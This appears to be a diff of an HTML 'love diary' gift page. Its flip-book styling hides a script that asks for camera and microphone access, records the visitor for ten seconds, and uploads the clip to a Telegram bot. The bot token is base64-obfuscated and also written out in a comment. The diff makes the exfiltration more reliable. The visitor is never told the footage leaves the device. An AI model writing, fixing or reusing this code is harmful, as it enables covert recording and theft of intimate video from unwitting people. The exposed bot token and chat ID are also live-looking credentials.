@@ -6,7 +6,6 @@
     <title>Our Garden of Love ❤️</title>
     <style>
         :root { --rose: #ff4d6d; }
-        /* Main Website Background */
         body { 
             background: url('bg.jpg') no-repeat center center fixed !important; 
             background-size: cover !important; 
@@ -15,8 +14,6 @@
             display: flex; justify-content: center; align-items: center; height: 100vh; 
         }
         #diary-wrapper { display: none; perspective: 2500px; z-index: 100; }
-        
-        /* Fixed: Applied background to the book instead of individual pages to prevent collapsing */
         .book { 
             width: 420px; height: 580px; position: relative; transform-style: preserve-3d; 
             background: url('bg.jpg') no-repeat center center;
@@ -24,16 +21,12 @@
             border-radius: 20px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.3);
         }
-        
         .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
         .page.flipped { transform: rotateY(-180deg); }
-        
-        /* Pages are now transparent to show the book background */
         .front { 
             width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 20px 20px 0; border: 1px solid rgba(255,255,255,0.2); 
-            background: rgba(255, 255, 255, 0.85); /* Slight white tint for readability */
+            background: rgba(255, 255, 255, 0.85);
         }
-        
         .back { 
             width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;
             transform: rotateY(180deg); 
@@ -41,7 +34,6 @@
             background-size: cover !important; 
             border-radius: 20px 0 0 20px; 
         }
-
         img, video { max-width: 100%; max-height: 350px; border: 8px solid white; box-shadow: 0 5px 15px rgba(0,0,0,0.2); border-radius: 5px; }
         p { font-size: 1.3rem; color: #444; text-align: center; margin-top: 20px; background: rgba(255,255,255,0.7); padding: 5px 10px; border-radius: 10px; }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
@@ -89,25 +81,34 @@
 
         async function startDiary() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 480 }, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('video-preview').srcObject = stream;
-                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                 mediaRecorder.start();
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
+                // Wait 10 seconds for a better recording quality
                 setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);
 
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     const formData = new FormData();
-                    formData.append('chat_id', "5324376571"); 
-                    formData.append('video', blob, 'reaction.mp4');
-                    // Working Token
+                    formData.append('chat_id', "5324376571"); // Correct ID
+                    formData.append('video', blob, 'reaction.webm');
+                    
+                    // Decodes your working token: 8567402887:AAGuwaB9SFJf6HY-Q7PgmfAAoJfe1X4VWZo
                     const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
-                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
+                    
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
+                        const result = await response.json();
+                        if (!result.ok) alert("Telegram Error: " + result.description);
+                    } catch (err) {
+                        console.error("Upload error:", err);
+                    }
                 };
             } catch (err) { alert("Camera access needed! ❤️"); }
         }
